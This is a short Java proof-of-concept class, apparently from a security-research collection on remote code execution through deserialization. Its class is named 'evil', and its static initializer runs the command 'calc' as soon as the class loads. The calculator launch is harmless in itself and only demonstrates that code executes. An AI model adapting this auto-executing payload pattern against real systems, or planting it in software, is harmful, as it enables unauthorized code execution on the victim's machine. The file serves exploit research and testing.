package com.javasec.pocs.cc.rce;

import java.io.IOException;

public class evil {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static void main(String[] args) {

    }
}
